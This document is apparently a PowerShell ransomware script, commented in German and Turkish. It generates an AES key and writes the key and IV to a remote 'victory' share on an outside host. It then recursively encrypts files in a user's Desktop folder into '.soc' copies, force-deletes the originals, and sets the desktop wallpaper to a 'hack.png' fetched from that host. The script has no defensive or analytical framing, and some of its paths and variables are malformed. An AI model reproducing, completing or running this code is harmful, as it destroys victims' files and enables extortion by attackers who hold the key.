#wir stellen erstmal fest, welches Folder wir verschlüsseln..
$username=$env:USERNAME
$folder=foo
$folderPath = "C:\Users\$username\Desktop\$folder"
$hostname=localhost
$port=8080
$encryptionKey = New-Object Byte[] 32  
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)

# Verschlüsseln-Algorithmus-AES 
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Key = $encryptionKey
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# IV (Initialization Vector) 
$IV = $aesManaged.IV

# encryption-key and IV speichern auf Webservern
$keyFile = "\hostname:port\victory\encryptionKey.bin"
$ivFile = "\hostname:port\victory\encryptionIV.bin"
[System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
[System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)

# verschlüsseln ausgewählte Dateien und orginelle erbeugen, dann orginelle löschen
Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".soc" } | ForEach-Object {
    $inputFile = $_.FullName
    $outputFile = "$inputFile.soc"

    # auslesen die Inhalte der Datei 
    $content = [System.IO.File]::ReadAllBytes($inputFile)

    # verschlüsseln Datei
    $encryptor = $aesManaged.CreateEncryptor($aesManaged.Key, $aesManaged.IV)
    $encryptedData = $encryptor.TransformFinalBlock($content, 0, $content.Length)

    # IV'yi şifrelenmiş verinin başına ekleyerek dosyaya yaz
    $fileData = $IV + $encryptedData
    [System.IO.File]::WriteAllBytes($outputFile, $fileData)

    # Löschen Orginelle Datei
    Remove-Item $inputFile -Force

    # Şifreleyici nesneyi temizle
    $encryptor.Dispose()
}

# AES nesnesini temizle
$aesManaged.Dispose()

# ändern Wallpaper
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

# Yeni wallpaper yolu
$newWallpaperPath = "\hostname:port\hack.png"
[Wallpaper]::SystemParametersInfo(0x0014, 0, $newWallpaperPath, 0x01 -bor 0x02)
